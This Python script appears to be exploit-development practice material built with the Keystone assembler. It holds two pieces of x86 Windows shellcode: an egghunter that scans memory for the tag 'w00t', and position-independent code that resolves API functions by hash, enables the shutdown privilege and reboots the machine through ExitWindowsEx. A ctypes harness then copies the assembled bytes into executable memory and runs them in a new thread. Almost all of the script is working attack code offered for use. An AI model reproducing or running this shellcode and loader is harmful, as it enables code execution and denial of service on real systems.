import ctypes, struct
from keystone import *

CODE = (
    # We use the edx register as a memory page counter
    "							 "
    "	loop_inc_page:			 "
    # Go to the last address in the memory page
    "		or dx, 0x0fff		;"
    "	loop_inc_one:			 "
    # Increase the memory counter by one
    "		inc edx				;"
    "	loop_check:				 "
    # Save the edx register which holds our memory 
    # address on the stack
    "		push edx			;"
    # Push the system call number 
    "		mov eax, 0xfffffe3a 			;"
    "		neg eax				;"
    # Perform the system call 发起调用
    "		int 0x2e			;"
    # Check for access violation, 0xc0000005 
    # (ACCESS_VIOLATION)
    "		cmp al,05			;"
    # Restore the edx register to check later 
    # for our egg
    "		pop edx				;"
    "	loop_check_valid:		 "
    # If access violation encountered, go to n
    # ext page
    "		je loop_inc_page	;"
    "	is_egg:					 "
    # Load egg (w00t in this example) into 
    # the eax register
    "		mov eax, 0x74303077	;"
    # Initializes pointer with current checked 
    # address 
    "		mov edi, edx		;"
    # Compare eax with doubleword at edi and 
    # set status flags
    "		scasd				;"
    # No match, we will increase our memory 
    # counter by one
    "		jnz loop_inc_one	;"
    # First part of the egg detected, check for 
    # the second part
    "		scasd				;"
    # No match, we found just a location 
    # with half an egg
    "		jnz loop_inc_one	;"
    "	matched:				 "
    # The edi register points to the first 
    # byte of our buffer, we can jump to it
    "		jmp edi				;"
)

CODE2 = '''
    start:
        mov ebp, esp                    ;
        add esp, 0fffff9f0H             ;
    find_kernel32:
        xor ecx,ecx                     ;
        mov esi,fs:[ecx+30h]            ;
        mov esi,[esi+0Ch]               ;
        mov esi,[esi+1Ch]               ;
    next_module:
        mov ebx, [esi+8h]               ;
        mov edi, [esi+20h]              ;
        mov esi, [esi]                  ;
        cmp [edi+12*2], cx              ;
        jne next_module                 ;
    find_function_shorten:
        jmp find_function_shorten_bnc   ;
    find_function_ret:
        pop esi                         ;
        mov [ebp+4H], esi             ;
        jmp resolve_symbols_kernel32    ;
    find_function_shorten_bnc:
        call find_function_ret          ;
    find_function:
        pushad                          ;
        mov eax, [ebx+3ch]             ;
        mov edi, [ebx+eax+78h]         ;
        add edi, ebx                    ;
        mov ecx, [edi+18h]             ;
        mov eax, [edi+20h]             ;
        add eax, ebx                    ;
        mov [ebp-4], eax                ;
    find_function_loop:
        jecxz find_function_finished    ;
        dec ecx                         ;
        mov eax, [ebp-4]                ;
        mov esi, [eax+ecx*4]            ;
        add esi, ebx                    ;
    compute_hash:
        xor eax, eax                    ;
        cdq                             ;
        cld                             ;
    compute_hash_again:
        lodsb                           ;
        test al, al                     ;
        jz compute_hash_finished        ;
        ror edx, 0dH                   ;
        add edx, eax                    ;
        jmp compute_hash_again          ;
    compute_hash_finished:
    find_function_compare:
        cmp edx, [esp+24H]             ;
        jnz find_function_loop          ;
        mov edx, [edi+24H]             ;
        add edx, ebx                    ;
        mov cx, [edx+2*ecx]             ;
        mov edx, [edi+1cH]             ;
        add edx, ebx                    ;
        mov eax, [edx+4*ecx]            ;
        add eax, ebx                   ;
        mov [esp+1cH], eax             ;
    find_function_finished:
        popad                          ;
        ret                            ;

    resolve_symbols_kernel32:
        push 78b5b983h
        call dword ptr [ebp+4h]        ;
        mov [ebp+10h], eax             ;#Save TerminateProcess address for later

        push 0ec0e4e8eh
        call dword ptr [ebp+4h]        ;
        mov [ebp+14h], eax             ;#Save LoadLibraryA address for later

        push 7B8F17E6h
        call dword ptr [ebp+4h]        ;
        mov [ebp+18h], eax             ;#Save GetCurrentProcess address for later
        load_Advapi32:
        push 0h
        push 6c6c642eh;
        push 32336970h;
        push 61766441h;
        push esp;
        call dword ptr [ebp+14h];
        mov ebx, eax                   ;#Move the base address of Advapi32.dll to EBX

        push 591EA70Fh;
        call dword ptr [ebp+4h]        ;
        mov [ebp+1ch], eax             ;#Save OpenProcessToken address for later

        push 97E8C2A2h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+20h], eax             ;#Save LookupPrivilegeValueA address for later

        push 24488A0Fh;
        call dword ptr [ebp+4h]        ;
        mov [ebp+24h], eax             ;#Save AdjustTokenPrivileges address for later

    load_User32:
        push 00006c6ch;
        push 642e3233h;
        push 72657375h;
        push esp;
        call dword ptr [ebp+14h];
        mov ebx, eax                   ;#Move the base address of User32.dll to EBX

        push 89DABEF5h;
        call dword ptr [ebp+4h]        ;
        mov [ebp+28h], eax             ;#Save ExitWindowsEx address for later

    open_process_token:
        call dword ptr [ebp+18h]       ;#call GetCurrentProcess func
        lea ebx, [ebp+30h];
        push ebx;
        xor ecx, ecx;
        mov cl, 28h;
        push ecx;
        push eax;
        call dword ptr [ebp+1ch]       ;#call OpenProcessToken func

    lookup_privilege_value:
        push 00656765h;
        push 6c697669h;
        push 72506e77h;
        push 6f647475h;
        push 68536553h;
        mov ecx, esp;
        sub esp, 10h;        
        mov esi, esp;
        lea ebx, [esp+4];
        push ebx;
        push ecx;
        xor ecx, ecx;
        push ecx;
        call dword ptr [ebp+20h]       ;#call LookupPrivilegeValueA func

    adjust_token_privilege:
        xor ecx, ecx;
        inc ecx;
        mov dword ptr [esi], ecx       ;#Set tp.PrivilegeCount to 1
        inc ecx;
        mov dword ptr [esi+12], ecx    ;#Set tp.Privileges[0].Attributes to SE_PRIVILEGE_ENABLED
        xor ecx, ecx;
        push ecx;
        push ecx;
        push ecx;
        lea ebx, [esi];
        push ebx;
        push ecx;
        push [ebp+30h];
        call dword ptr [ebp+24h]       ;#call AdjustTokenPrivileges func

    reboot:
        xor ecx, ecx;
        push ecx;
        mov cl, 02h;
        push ecx;
        call dword ptr [ebp+28h]       ;#call ExitWindowsEx func
'''

# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE2)
egghunter = ""
for dec in encoding:
    egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print("egghunter = (\"" + egghunter + "\")")

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
